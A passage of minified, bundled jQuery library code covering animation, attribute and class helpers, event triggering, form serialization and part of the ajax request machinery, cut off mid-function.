                    return this.options.duration ? this.pos = t = C.easing[this.easing](e, this.options.duration * e, 0, 1, this.options.duration) : this.pos = t = e, this.now = (this.end - this.start) * t + this.start, this.options.step && this.options.step.call(this.elem, this.now, this), i && i.set ? i.set(this) : Qe.propHooks._default.set(this), this
                }
            }).init.prototype = Qe.prototype, (Qe.propHooks = {
                _default: {
                    get: function(e) {
                        var t;
                        return 1 !== e.elem.nodeType || null != e.elem[e.prop] && null == e.elem.style[e.prop] ? e.elem[e.prop] : (t = C.css(e.elem, e.prop, "")) && "auto" !== t ? t : 0
                    },
                    set: function(e) {
                        C.fx.step[e.prop] ? C.fx.step[e.prop](e) : 1 !== e.elem.nodeType || null == e.elem.style[C.cssProps[e.prop]] && !C.cssHooks[e.prop] ? e.elem[e.prop] = e.now : C.style(e.elem, e.prop, e.now + e.unit)
                    }
                }
            }).scrollTop = Qe.propHooks.scrollLeft = {
                set: function(e) {
                    e.elem.nodeType && e.elem.parentNode && (e.elem[e.prop] = e.now)
                }
            }, C.easing = {
                linear: function(e) {
                    return e
                },
                swing: function(e) {
                    return .5 - Math.cos(e * Math.PI) / 2
                },
                _default: "swing"
            }, C.fx = Qe.prototype.init, C.fx.step = {};
            var Je, Ze, et, tt, it = /^(?:toggle|show|hide)$/,
                nt = /queueHooks$/;

            function ot() {
                Ze && (!1 === T.hidden && S.requestAnimationFrame ? S.requestAnimationFrame(ot) : S.setTimeout(ot, C.fx.interval), C.fx.tick())
            }

            function st() {
                return S.setTimeout(function() {
                    Je = void 0
                }), Je = Date.now()
            }

            function rt(e, t) {
                var i, n = 0,
                    o = {
                        height: e
                    };
                for (t = t ? 1 : 0; n < 4; n += 2 - t) o["margin" + (i = ie[n])] = o["padding" + i] = e;
                return t && (o.opacity = o.width = e), o
            }

            function at(e, t, i) {
                for (var n, o = (lt.tweeners[t] || []).concat(lt.tweeners["*"]), s = 0, r = o.length; s < r; s++)
                    if (n = o[s].call(i, t, e)) return n
            }

            function lt(s, e, t) {
                var i, r, n = 0,
                    o = lt.prefilters.length,
                    a = C.Deferred().always(function() {
                        delete l.elem
                    }),
                    l = function() {
                        if (r) return !1;
                        for (var e = Je || st(), t = Math.max(0, d.startTime + d.duration - e), i = 1 - (t / d.duration || 0), n = 0, o = d.tweens.length; n < o; n++) d.tweens[n].run(i);
                        return a.notifyWith(s, [d, i, t]), i < 1 && o ? t : (o || a.notifyWith(s, [d, 1, 0]), a.resolveWith(s, [d]), !1)
                    },
                    d = a.promise({
                        elem: s,
                        props: C.extend({}, e),
                        opts: C.extend(!0, {
                            specialEasing: {},
                            easing: C.easing._default
                        }, t),
                        originalProperties: e,
                        originalOptions: t,
                        startTime: Je || st(),
                        duration: t.duration,
                        tweens: [],
                        createTween: function(e, t) {
                            var i = C.Tween(s, d.opts, e, t, d.opts.specialEasing[e] || d.opts.easing);
                            return d.tweens.push(i), i
                        },
                        stop: function(e) {
                            var t = 0,
                                i = e ? d.tweens.length : 0;
                            if (r) return this;
                            for (r = !0; t < i; t++) d.tweens[t].run(1);
                            return e ? (a.notifyWith(s, [d, 1, 0]), a.resolveWith(s, [d, e])) : a.rejectWith(s, [d, e]), this
                        }
                    }),
                    c = d.props;
                for (function(e, t) {
                        var i, n, o, s, r;
                        for (i in e)
                            if (o = t[n = U(i)], s = e[i], Array.isArray(s) && (o = s[1], s = e[i] = s[0]), i !== n && (e[n] = s, delete e[i]), (r = C.cssHooks[n]) && "expand" in r)
                                for (i in s = r.expand(s), delete e[n], s) i in e || (e[i] = s[i], t[i] = o);
                            else t[n] = o
                    }(c, d.opts.specialEasing); n < o; n++)
                    if (i = lt.prefilters[n].call(d, s, c, d.opts)) return y(i.stop) && (C._queueHooks(d.elem, d.opts.queue).stop = i.stop.bind(i)), i;
                return C.map(c, at, d), y(d.opts.start) && d.opts.start.call(s, d), d.progress(d.opts.progress).done(d.opts.done, d.opts.complete).fail(d.opts.fail).always(d.opts.always), C.fx.timer(C.extend(l, {
                    elem: s,
                    anim: d,
                    queue: d.opts.queue
                })), d
            }
            C.Animation = C.extend(lt, {
                tweeners: {
                    "*": [function(e, t) {
                        var i = this.createTween(e, t);
                        return se(i.elem, e, te.exec(t), i), i
                    }]
                },
                tweener: function(e, t) {
                    for (var i, n = 0, o = (e = y(e) ? (t = e, ["*"]) : e.match(N)).length; n < o; n++) i = e[n], lt.tweeners[i] = lt.tweeners[i] || [], lt.tweeners[i].unshift(t)
                },
                prefilters: [function(e, t, i) {
                    var n, o, s, r, a, l, d, c, u = "width" in t || "height" in t,
                        p = this,
                        f = {},
                        h = e.style,
                        v = e.nodeType && ne(e),
                        g = V.get(e, "fxshow");
                    for (n in i.queue || (null == (r = C._queueHooks(e, "fx")).unqueued && (r.unqueued = 0, a = r.empty.fire, r.empty.fire = function() {
                            r.unqueued || a()
                        }), r.unqueued++, p.always(function() {
                            p.always(function() {
                                r.unqueued--, C.queue(e, "fx").length || r.empty.fire()
                            })
                        })), t)
                        if (o = t[n], it.test(o)) {
                            if (delete t[n], s = s || "toggle" === o, o === (v ? "hide" : "show")) {
                                if ("show" !== o || !g || void 0 === g[n]) continue;
                                v = !0
                            }
                            f[n] = g && g[n] || C.style(e, n)
                        }
                    if ((l = !C.isEmptyObject(t)) || !C.isEmptyObject(f))
                        for (n in u && 1 === e.nodeType && (i.overflow = [h.overflow, h.overflowX, h.overflowY], null == (d = g && g.display) && (d = V.get(e, "display")), "none" === (c = C.css(e, "display")) && (d ? c = d : (ae([e], !0), d = e.style.display || d, c = C.css(e, "display"), ae([e]))), ("inline" === c || "inline-block" === c && null != d) && "none" === C.css(e, "float") && (l || (p.done(function() {
                                h.display = d
                            }), null == d && (c = h.display, d = "none" === c ? "" : c)), h.display = "inline-block")), i.overflow && (h.overflow = "hidden", p.always(function() {
                                h.overflow = i.overflow[0], h.overflowX = i.overflow[1], h.overflowY = i.overflow[2]
                            })), l = !1, f) l || (g ? "hidden" in g && (v = g.hidden) : g = V.access(e, "fxshow", {
                            display: d
                        }), s && (g.hidden = !v), v && ae([e], !0), p.done(function() {
                            for (n in v || ae([e]), V.remove(e, "fxshow"), f) C.style(e, n, f[n])
                        })), l = at(v ? g[n] : 0, n, p), n in g || (g[n] = l.start, v && (l.end = l.start, l.start = 0))
                }],
                prefilter: function(e, t) {
                    t ? lt.prefilters.unshift(e) : lt.prefilters.push(e)
                }
            }), C.speed = function(e, t, i) {
                var n = e && "object" == (void 0 === e ? "undefined" : Vt(e)) ? C.extend({}, e) : {
                    complete: i || !i && t || y(e) && e,
                    duration: e,
                    easing: i && t || t && !y(t) && t
                };
                return C.fx.off ? n.duration = 0 : "number" != typeof n.duration && (n.duration in C.fx.speeds ? n.duration = C.fx.speeds[n.duration] : n.duration = C.fx.speeds._default), null != n.queue && !0 !== n.queue || (n.queue = "fx"), n.old = n.complete, n.complete = function() {
                    y(n.old) && n.old.call(this), n.queue && C.dequeue(this, n.queue)
                }, n
            }, C.fn.extend({
                fadeTo: function(e, t, i, n) {
                    return this.filter(ne).css("opacity", 0).show().end().animate({
                        opacity: t
                    }, e, i, n)
                },
                animate: function(t, e, i, n) {
                    var o = C.isEmptyObject(t),
                        s = C.speed(e, i, n),
                        r = function() {
                            var e = lt(this, C.extend({}, t), s);
                            (o || V.get(this, "finish")) && e.stop(!0)
                        };
                    return r.finish = r, o || !1 === s.queue ? this.each(r) : this.queue(s.queue, r)
                },
                stop: function(o, e, s) {
                    var r = function(e) {
                        var t = e.stop;
                        delete e.stop, t(s)
                    };
                    return "string" != typeof o && (s = e, e = o, o = void 0), e && !1 !== o && this.queue(o || "fx", []), this.each(function() {
                        var e = !0,
                            t = null != o && o + "queueHooks",
                            i = C.timers,
                            n = V.get(this);
                        if (t) n[t] && n[t].stop && r(n[t]);
                        else
                            for (t in n) n[t] && n[t].stop && nt.test(t) && r(n[t]);
                        for (t = i.length; t--;) i[t].elem !== this || null != o && i[t].queue !== o || (i[t].anim.stop(s), e = !1, i.splice(t, 1));
                        !e && s || C.dequeue(this, o)
                    })
                },
                finish: function(r) {
                    return !1 !== r && (r = r || "fx"), this.each(function() {
                        var e, t = V.get(this),
                            i = t[r + "queue"],
                            n = t[r + "queueHooks"],
                            o = C.timers,
                            s = i ? i.length : 0;
                        for (t.finish = !0, C.queue(this, r, []), n && n.stop && n.stop.call(this, !0), e = o.length; e--;) o[e].elem === this && o[e].queue === r && (o[e].anim.stop(!0), o.splice(e, 1));
                        for (e = 0; e < s; e++) i[e] && i[e].finish && i[e].finish.call(this);
                        delete t.finish
                    })
                }
            }), C.each(["toggle", "show", "hide"], function(e, n) {
                var o = C.fn[n];
                C.fn[n] = function(e, t, i) {
                    return null == e || "boolean" == typeof e ? o.apply(this, arguments) : this.animate(rt(n, !0), e, t, i)
                }
            }), C.each({
                slideDown: rt("show"),
                slideUp: rt("hide"),
                slideToggle: rt("toggle"),
                fadeIn: {
                    opacity: "show"
                },
                fadeOut: {
                    opacity: "hide"
                },
                fadeToggle: {
                    opacity: "toggle"
                }
            }, function(e, n) {
                C.fn[e] = function(e, t, i) {
                    return this.animate(n, e, t, i)
                }
            }), C.timers = [], C.fx.tick = function() {
                var e, t = 0,
                    i = C.timers;
                for (Je = Date.now(); t < i.length; t++)(e = i[t])() || i[t] !== e || i.splice(t--, 1);
                i.length || C.fx.stop(), Je = void 0
            }, C.fx.timer = function(e) {
                C.timers.push(e), C.fx.start()
            }, C.fx.interval = 13, C.fx.start = function() {
                Ze || (Ze = !0, ot())
            }, C.fx.stop = function() {
                Ze = null
            }, C.fx.speeds = {
                slow: 600,
                fast: 200,
                _default: 400
            }, C.fn.delay = function(n, e) {
                return n = C.fx && C.fx.speeds[n] || n, e = e || "fx", this.queue(e, function(e, t) {
                    var i = S.setTimeout(e, n);
                    t.stop = function() {
                        S.clearTimeout(i)
                    }
                })
            }, et = T.createElement("input"), tt = T.createElement("select").appendChild(T.createElement("option")), et.type = "checkbox", m.checkOn = "" !== et.value, m.optSelected = tt.selected, (et = T.createElement("input")).value = "t", et.type = "radio", m.radioValue = "t" === et.value;
            var dt, ct = C.expr.attrHandle;
            C.fn.extend({
                attr: function(e, t) {
                    return R(this, C.attr, e, t, 1 < arguments.length)
                },
                removeAttr: function(e) {
                    return this.each(function() {
                        C.removeAttr(this, e)
                    })
                }
            }), C.extend({
                attr: function(e, t, i) {
                    var n, o, s = e.nodeType;
                    if (3 !== s && 8 !== s && 2 !== s) return void 0 === e.getAttribute ? C.prop(e, t, i) : (1 === s && C.isXMLDoc(e) || (o = C.attrHooks[t.toLowerCase()] || (C.expr.match.bool.test(t) ? dt : void 0)), void 0 !== i ? null === i ? void C.removeAttr(e, t) : o && "set" in o && void 0 !== (n = o.set(e, i, t)) ? n : (e.setAttribute(t, i + ""), i) : o && "get" in o && null !== (n = o.get(e, t)) ? n : null == (n = C.find.attr(e, t)) ? void 0 : n)
                },
                attrHooks: {
                    type: {
                        set: function(e, t) {
                            if (!m.radioValue && "radio" === t && A(e, "input")) {
                                var i = e.value;
                                return e.setAttribute("type", t), i && (e.value = i), t
                            }
                        }
                    }
                },
                removeAttr: function(e, t) {
                    var i, n = 0,
                        o = t && t.match(N);
                    if (o && 1 === e.nodeType)
                        for (; i = o[n++];) e.removeAttribute(i)
                }
            }), dt = {
                set: function(e, t, i) {
                    return !1 === t ? C.removeAttr(e, i) : e.setAttribute(i, i), i
                }
            }, C.each(C.expr.match.bool.source.match(/\w+/g), function(e, t) {
                var r = ct[t] || C.find.attr;
                ct[t] = function(e, t, i) {
                    var n, o, s = t.toLowerCase();
                    return i || (o = ct[s], ct[s] = n, n = null != r(e, t, i) ? s : null, ct[s] = o), n
                }
            });
            var ut = /^(?:input|select|textarea|button)$/i,
                pt = /^(?:a|area)$/i;

            function ft(e) {
                return (e.match(N) || []).join(" ")
            }

            function ht(e) {
                return e.getAttribute && e.getAttribute("class") || ""
            }

            function vt(e) {
                return Array.isArray(e) ? e : "string" == typeof e && e.match(N) || []
            }
            C.fn.extend({
                prop: function(e, t) {
                    return R(this, C.prop, e, t, 1 < arguments.length)
                },
                removeProp: function(e) {
                    return this.each(function() {
                        delete this[C.propFix[e] || e]
                    })
                }
            }), C.extend({
                prop: function(e, t, i) {
                    var n, o, s = e.nodeType;
                    if (3 !== s && 8 !== s && 2 !== s) return 1 === s && C.isXMLDoc(e) || (t = C.propFix[t] || t, o = C.propHooks[t]), void 0 !== i ? o && "set" in o && void 0 !== (n = o.set(e, i, t)) ? n : e[t] = i : o && "get" in o && null !== (n = o.get(e, t)) ? n : e[t]
                },
                propHooks: {
                    tabIndex: {
                        get: function(e) {
                            var t = C.find.attr(e, "tabindex");
                            return t ? parseInt(t, 10) : ut.test(e.nodeName) || pt.test(e.nodeName) && e.href ? 0 : -1
                        }
                    }
                },
                propFix: {
                    for: "htmlFor",
                    class: "className"
                }
            }), m.optSelected || (C.propHooks.selected = {
                get: function(e) {
                    var t = e.parentNode;
                    return t && t.parentNode && t.parentNode.selectedIndex, null
                },
                set: function(e) {
                    var t = e.parentNode;
                    t && (t.selectedIndex, t.parentNode && t.parentNode.selectedIndex)
                }
            }), C.each(["tabIndex", "readOnly", "maxLength", "cellSpacing", "cellPadding", "rowSpan", "colSpan", "useMap", "frameBorder", "contentEditable"], function() {
                C.propFix[this.toLowerCase()] = this
            }), C.fn.extend({
                addClass: function(t) {
                    var e, i, n, o, s, r, a, l = 0;
                    if (y(t)) return this.each(function(e) {
                        C(this).addClass(t.call(this, e, ht(this)))
                    });
                    if ((e = vt(t)).length)
                        for (; i = this[l++];)
                            if (o = ht(i), n = 1 === i.nodeType && " " + ft(o) + " ") {
                                for (r = 0; s = e[r++];) n.indexOf(" " + s + " ") < 0 && (n += s + " ");
                                o !== (a = ft(n)) && i.setAttribute("class", a)
                            }
                    return this
                },
                removeClass: function(t) {
                    var e, i, n, o, s, r, a, l = 0;
                    if (y(t)) return this.each(function(e) {
                        C(this).removeClass(t.call(this, e, ht(this)))
                    });
                    if (!arguments.length) return this.attr("class", "");
                    if ((e = vt(t)).length)
                        for (; i = this[l++];)
                            if (o = ht(i), n = 1 === i.nodeType && " " + ft(o) + " ") {
                                for (r = 0; s = e[r++];)
                                    for (; - 1 < n.indexOf(" " + s + " ");) n = n.replace(" " + s + " ", " ");
                                o !== (a = ft(n)) && i.setAttribute("class", a)
                            }
                    return this
                },
                toggleClass: function(o, t) {
                    var s = void 0 === o ? "undefined" : Vt(o),
                        r = "string" === s || Array.isArray(o);
                    return "boolean" == typeof t && r ? t ? this.addClass(o) : this.removeClass(o) : y(o) ? this.each(function(e) {
                        C(this).toggleClass(o.call(this, e, ht(this), t), t)
                    }) : this.each(function() {
                        var e, t, i, n;
                        if (r)
                            for (t = 0, i = C(this), n = vt(o); e = n[t++];) i.hasClass(e) ? i.removeClass(e) : i.addClass(e);
                        else void 0 !== o && "boolean" !== s || ((e = ht(this)) && V.set(this, "__className__", e), this.setAttribute && this.setAttribute("class", e || !1 === o ? "" : V.get(this, "__className__") || ""))
                    })
                },
                hasClass: function(e) {
                    var t, i, n = 0;
                    for (t = " " + e + " "; i = this[n++];)
                        if (1 === i.nodeType && -1 < (" " + ft(ht(i)) + " ").indexOf(t)) return !0;
                    return !1
                }
            });
            var gt = /\r/g;
            C.fn.extend({
                val: function(i) {
                    var n, e, o, t = this[0];
                    return arguments.length ? (o = y(i), this.each(function(e) {
                        var t;
                        1 === this.nodeType && (null == (t = o ? i.call(this, e, C(this).val()) : i) ? t = "" : "number" == typeof t ? t += "" : Array.isArray(t) && (t = C.map(t, function(e) {
                            return null == e ? "" : e + ""
                        })), (n = C.valHooks[this.type] || C.valHooks[this.nodeName.toLowerCase()]) && "set" in n && void 0 !== n.set(this, t, "value") || (this.value = t))
                    })) : t ? (n = C.valHooks[t.type] || C.valHooks[t.nodeName.toLowerCase()]) && "get" in n && void 0 !== (e = n.get(t, "value")) ? e : "string" == typeof(e = t.value) ? e.replace(gt, "") : null == e ? "" : e : void 0
                }
            }), C.extend({
                valHooks: {
                    option: {
                        get: function(e) {
                            var t = C.find.attr(e, "value");
                            return null != t ? t : ft(C.text(e))
                        }
                    },
                    select: {
                        get: function(e) {
                            var t, i, n, o = e.options,
                                s = e.selectedIndex,
                                r = "select-one" === e.type,
                                a = r ? null : [],
                                l = r ? s + 1 : o.length;
                            for (n = s < 0 ? l : r ? s : 0; n < l; n++)
                                if (((i = o[n]).selected || n === s) && !i.disabled && (!i.parentNode.disabled || !A(i.parentNode, "optgroup"))) {
                                    if (t = C(i).val(), r) return t;
                                    a.push(t)
                                }
                            return a
                        },
                        set: function(e, t) {
                            for (var i, n, o = e.options, s = C.makeArray(t), r = o.length; r--;)((n = o[r]).selected = -1 < C.inArray(C.valHooks.option.get(n), s)) && (i = !0);
                            return i || (e.selectedIndex = -1), s
                        }
                    }
                }
            }), C.each(["radio", "checkbox"], function() {
                C.valHooks[this] = {
                    set: function(e, t) {
                        if (Array.isArray(t)) return e.checked = -1 < C.inArray(C(e).val(), t)
                    }
                }, m.checkOn || (C.valHooks[this].get = function(e) {
                    return null === e.getAttribute("value") ? "on" : e.value
                })
            }), m.focusin = "onfocusin" in S;
            var mt = /^(?:focusinfocus|focusoutblur)$/,
                yt = function(e) {
                    e.stopPropagation()
                };
            C.extend(C.event, {
                trigger: function(e, t, i, n) {
                    var o, s, r, a, l, d, c, u, p = [i || T],
                        f = g.call(e, "type") ? e.type : e,
                        h = g.call(e, "namespace") ? e.namespace.split(".") : [];
                    if (s = u = r = i = i || T, 3 !== i.nodeType && 8 !== i.nodeType && !mt.test(f + C.event.triggered) && (-1 < f.indexOf(".") && (f = (h = f.split(".")).shift(), h.sort()), l = f.indexOf(":") < 0 && "on" + f, (e = e[C.expando] ? e : new C.Event(f, "object" == (void 0 === e ? "undefined" : Vt(e)) && e)).isTrigger = n ? 2 : 3, e.namespace = h.join("."), e.rnamespace = e.namespace ? new RegExp("(^|\\.)" + h.join("\\.(?:.*\\.|)") + "(\\.|$)") : null, e.result = void 0, e.target || (e.target = i), t = null == t ? [e] : C.makeArray(t, [e]), c = C.event.special[f] || {}, n || !c.trigger || !1 !== c.trigger.apply(i, t))) {
                        if (!n && !c.noBubble && !b(i)) {
                            for (a = c.delegateType || f, mt.test(a + f) || (s = s.parentNode); s; s = s.parentNode) p.push(s), r = s;
                            r === (i.ownerDocument || T) && p.push(r.defaultView || r.parentWindow || S)
                        }
                        for (o = 0;
                            (s = p[o++]) && !e.isPropagationStopped();) u = s, e.type = 1 < o ? a : c.bindType || f, (d = (V.get(s, "events") || {})[e.type] && V.get(s, "handle")) && d.apply(s, t), (d = l && s[l]) && d.apply && G(s) && (e.result = d.apply(s, t), !1 === e.result && e.preventDefault());
                        return e.type = f, n || e.isDefaultPrevented() || c._default && !1 !== c._default.apply(p.pop(), t) || !G(i) || l && y(i[f]) && !b(i) && ((r = i[l]) && (i[l] = null), C.event.triggered = f, e.isPropagationStopped() && u.addEventListener(f, yt), i[f](), e.isPropagationStopped() && u.removeEventListener(f, yt), C.event.triggered = void 0, r && (i[l] = r)), e.result
                    }
                },
                simulate: function(e, t, i) {
                    var n = C.extend(new C.Event, i, {
                        type: e,
                        isSimulated: !0
                    });
                    C.event.trigger(n, null, t)
                }
            }), C.fn.extend({
                trigger: function(e, t) {
                    return this.each(function() {
                        C.event.trigger(e, t, this)
                    })
                },
                triggerHandler: function(e, t) {
                    var i = this[0];
                    if (i) return C.event.trigger(e, t, i, !0)
                }
            }), m.focusin || C.each({
                focus: "focusin",
                blur: "focusout"
            }, function(i, n) {
                var o = function(e) {
                    C.event.simulate(n, e.target, C.event.fix(e))
                };
                C.event.special[n] = {
                    setup: function() {
                        var e = this.ownerDocument || this,
                            t = V.access(e, n);
                        t || e.addEventListener(i, o, !0), V.access(e, n, (t || 0) + 1)
                    },
                    teardown: function() {
                        var e = this.ownerDocument || this,
                            t = V.access(e, n) - 1;
                        t ? V.access(e, n, t) : (e.removeEventListener(i, o, !0), V.remove(e, n))
                    }
                }
            });
            var bt = S.location,
                wt = Date.now(),
                xt = /\?/;
            C.parseXML = function(e) {
                var t;
                if (!e || "string" != typeof e) return null;
                try {
                    t = (new S.DOMParser).parseFromString(e, "text/xml")
                } catch (e) {
                    t = void 0
                }
                return t && !t.getElementsByTagName("parsererror").length || C.error("Invalid XML: " + e), t
            };
            var kt = /\[\]$/,
                St = /\r?\n/g,
                Tt = /^(?:submit|button|image|reset|file)$/i,
                Ct = /^(?:input|select|textarea|keygen)/i;

            function $t(i, e, n, o) {
                var t;
                if (Array.isArray(e)) C.each(e, function(e, t) {
                    n || kt.test(i) ? o(i, t) : $t(i + "[" + ("object" == (void 0 === t ? "undefined" : Vt(t)) && null != t ? e : "") + "]", t, n, o)
                });
                else if (n || "object" !== x(e)) o(i, e);
                else
                    for (t in e) $t(i + "[" + t + "]", e[t], n, o)
            }
            C.param = function(e, t) {
                var i, n = [],
                    o = function(e, t) {
                        var i = y(t) ? t() : t;
                        n[n.length] = encodeURIComponent(e) + "=" + encodeURIComponent(null == i ? "" : i)
                    };
                if (Array.isArray(e) || e.jquery && !C.isPlainObject(e)) C.each(e, function() {
                    o(this.name, this.value)
                });
                else
                    for (i in e) $t(i, e[i], t, o);
                return n.join("&")
            }, C.fn.extend({
                serialize: function() {
                    return C.param(this.serializeArray())
                },
                serializeArray: function() {
                    return this.map(function() {
                        var e = C.prop(this, "elements");
                        return e ? C.makeArray(e) : this
                    }).filter(function() {
                        var e = this.type;
                        return this.name && !C(this).is(":disabled") && Ct.test(this.nodeName) && !Tt.test(e) && (this.checked || !le.test(e))
                    }).map(function(e, t) {
                        var i = C(this).val();
                        return null == i ? null : Array.isArray(i) ? C.map(i, function(e) {
                            return {
                                name: t.name,
                                value: e.replace(St, "\r\n")
                            }
                        }) : {
                            name: t.name,
                            value: i.replace(St, "\r\n")
                        }
                    }).get()
                }
            });
            var At = /%20/g,
                jt = /#.*$/,
                Et = /([?&])_=[^&]*/,
                Mt = /^(.*?):[ \t]*([^\r\n]*)$/gm,
                Pt = /^(?:GET|HEAD)$/,
                Dt = /^\/\//,
                qt = {},
                Ht = {},
                Nt = "*/".concat("*"),
                Ot = T.createElement("a");

            function Lt(s) {
                return function(e, t) {
                    "string" != typeof e && (t = e, e = "*");
                    var i, n = 0,
                        o = e.toLowerCase().match(N) || [];
                    if (y(t))
                        for (; i = o[n++];) "+" === i[0] ? (i = i.slice(1) || "*", (s[i] = s[i] || []).unshift(t)) : (s[i] = s[i] || []).push(t)
                }
            }

            function _t(t, o, s, r) {
                var a = {},
                    l = t === Ht;

                function d(e) {
                    var n;
                    return a[e] = !0, C.each(t[e] || [], function(e, t) {
                        var i = t(o, s, r);
                        return "string" != typeof i || l || a[i] ? l ? !(n = i) : void 0 : (o.dataTypes.unshift(i), d(i), !1)
                    }), n
                }
                return d(o.dataTypes[0]) || !a["*"] && d("*")
            }

            function It(e, t) {
                var i, n, o = C.ajaxSettings.flatOptions || {};
                for (i in t) void 0 !== t[i] && ((o[i] ? e : n || (n = {}))[i] = t[i]);
                return n && C.extend(!0, e, n), e
            }
            Ot.href = bt.href, C.extend({
                active: 0,
                lastModified: {},
                etag: {},
                ajaxSettings: {
                    url: bt.href,
                    type: "GET",
                    isLocal: /^(?:about|app|app-storage|.+-extension|file|res|widget):$/.test(bt.protocol),
                    global: !0,
                    processData: !0,
                    async: !0,
                    contentType: "application/x-www-form-urlencoded; charset=UTF-8",
                    accepts: {
                        "*": Nt,
                        text: "text/plain",
                        html: "text/html",
                        xml: "application/xml, text/xml",
                        json: "application/json, text/javascript"
                    },
                    contents: {
                        xml: /\bxml\b/,
                        html: /\bhtml/,
                        json: /\bjson\b/
                    },
                    responseFields: {
                        xml: "responseXML",
                        text: "responseText",
                        json: "responseJSON"
                    },
                    converters: {
                        "* text": String,
                        "text html": !0,
                        "text json": JSON.parse,
                        "text xml": C.parseXML
                    },
                    flatOptions: {
                        url: !0,
                        context: !0
                    }
                },
                ajaxSetup: function(e, t) {
                    return t ? It(It(e, C.ajaxSettings), t) : It(C.ajaxSettings, e)
                },
                ajaxPrefilter: Lt(qt),
                ajaxTransport: Lt(Ht),
                ajax: function(e, t) {
                    "object" == (void 0 === e ? "undefined" : Vt(e)) && (t = e, e = void 0), t = t || {};
                    var c, u, p, i, f, n, h, v, o, s, g = C.ajaxSetup({}, t),
                        m = g.context || g,
                        y = g.context && (m.nodeType || m.jquery) ? C(m) : C.event,
                        b = C.Deferred(),
                        w = C.Callbacks("once memory"),
                        x = g.statusCode || {},
                        r = {},
                        a = {},
                        l = "canceled",
                        k = {
                            readyState: 0,
                            getResponseHeader: function(e) {
                                var t;
                                if (h) {
                                    if (!i)
                                        for (i = {}; t = Mt.exec(p);) i[t[1].toLowerCase()] = t[2];
                                    t = i[e.toLowerCase()]
                                }
                                return null == t ? null : t
                            },
                            getAllResponseHeaders: function() {
                                return h ? p : null
                            },
                            setRequestHeader: function(e, t) {
                                return null == h && (e = a[e.toLowerCase()] = a[e.toLowerCase()] || e, r[e] = t), this
                            },
                            overrideMimeType: function(e) {
                                return null == h && (g.mimeType = e), this
                            },
                            statusCode: function(e) {
                                var t;
                                if (e)
                                    if (h) k.always(e[k.status]);
                                    else
                                        for (t in e) x[t] = [x[t], e[t]];
                                return this
                            },
                            abort: function(e) {
                                var t = e || l;
                                return c && c.abort(t), d(0, t), this
                            }
                        };
                    if (b.promise(k), g.url = ((e || g.url || bt.href) + "").replace(Dt, bt.protocol + "//"), g.type = t.method || t.type || g.method || g.type, g.dataTypes = (g.dataType || "*").toLowerCase().match(N) || [""], null == g.crossDomain) {
                        n = T.createElement("a");
                        try {
                            n.href = g.url, n.href = n.href, g.crossDomain = Ot.protocol + "//" + Ot.host != n.protocol + "//" + n.host
                        } catch (e) {
                            g.crossDomain = !0
                        }
                    }
                    if (g.data && g.processData && "string" != typeof g.data && (g.data = C.param(g.data, g.traditional)), _t(qt, g, t, k), h) return k;
                    for (o in (v = C.event && g.global) && 0 == C.active++ && C.event.trigger("ajaxStart"), g.type = g.type.toUpperCase(), g.hasContent = !Pt.test(g.type), u = g.url.replace(jt, ""), g.hasContent ? g.data && g.processData && 0 === (g.contentType || "").indexOf("application/x-www-form-urlencoded") && (g.data = g.data.replace(At, "+")) : (s = g.url.slice(u.length), g.data && (g.processData || "string" == typeof g.data) && (u += (xt.test(u) ? "&" : "?") + g.data, delete g.data), !1 === g.cache && (u = u.replace(Et, "$1"), s = (xt.test(u) ? "&" : "?") + "_=" + wt++ +s), g.url = u + s), g.ifModified && (C.lastModified[u] && k.setRequestHeader("If-Modified-Since", C.lastModified[u]), C.etag[u] && k.setRequestHeader("If-None-Match", C.etag[u])), (g.data && g.hasContent && !1 !== g.contentType || t.contentType) && k.setRequestHeader("Content-Type", g.contentType), k.setRequestHeader("Accept", g.dataTypes[0] && g.accepts[g.dataTypes[0]] ? g.accepts[g.dataTypes[0]] + ("*" !== g.dataTypes[0] ? ", " + Nt + "; q=0.01" : "") : g.accepts["*"]), g.headers) k.setRequestHeader(o, g.headers[o]);
                    if (g.beforeSend && (!1 === g.beforeSend.call(m, k, g) || h)) return k.abort();
                    if (l = "abort", w.add(g.complete), k.done(g.success), k.fail(g.error), c = _t(Ht, g, t, k)) {
                        if (k.readyState = 1, v && y.trigger("ajaxSend", [k, g]), h) return k;
                        g.async && 0 < g.timeout && (f = S.setTimeout(function() {
                            k.abort("timeout")
                        }, g.timeout));
                        try {
                            h = !1, c.send(r, d)
                        } catch (e) {
                            if (h) throw e;
                            d(-1, e)
                        }
                    } else d(-1, "No Transport");

                    function d(e, t, i, n) {
                        var o, s, r, a, l, d = t;
                        h || (h = !0, f && S.clearTimeout(f), c = void 0, p = n || "", k.readyState = 0 < e ? 4 : 0, o = 200 <= e && e < 300 || 304 === e, i && (a = function(e, t, i) {
                            for (var n, o, s, r, a = e.contents, l = e.dataTypes;
                                "*" === l[0];) l.shift(), void 0 === n && (n = e.mimeType || t.getResponseHeader("Content-Type"));
                            if (n)
                                for (o in a)
                                    if (a[o] && a[o].test(n)) {
                                        l.unshift(o);
                                        break
                                    }
                            if (l[0] in i) s = l[0];
                            else {
                                for (o in i) {
                                    if (!l[0] || e.converters[o + " " + l[0]]) {
                                        s = o;
                                        break
                                    }
                                    r || (r = o)
                                }
                                s = s || r
                            }
                            if (s) return s !== l[0] && l.unshift(s), i[s]
                        }(g, k, i)), a = function(e, t, i, n) {
                            var o, s, r, a, l, d = {},
                                c = e.dataTypes.slice();
                            if (c[1])
                                for (r in e.converters) d[r.toLowerCase()] = e.converters[r];
                            for (s = c.shift(); s;)
                                if (e.responseFields[s] && (i[e.responseFields[s]] = t), !l && n && e.dataFilter && (t = e.dataFilter(t, e.dataType)), l = s, s = c.shift())
                                    if ("*" === s) s = l;
                                    else if ("*" !== l && l !== s) {
                                if (!(r = d[l + " " + s] || d["* " + s]))
                                    for (o in d)
                                        if ((a = o.split(" "))[1] === s && (r = d[l + " " + a[0]] || d["* " + a[0]])) {
                                            !0 === r ? r = d[o] : !0 !== d[o] && (s = a[0], c.unshift(a[1]));
                                            break
                                        }
                                if (!0 !== r)
                                    if (r && e.throws) t = r(t);
                                    else try {
                                        t = r(t)
                                    } catch (e) {
                                        return {
                                            state: "parsererror",
                                            error: r ? e : "No conversion from " + l + " to " + s
                                        }
                                    }
                            }
                            return {
                                state: "success",
                                data: t
                            }
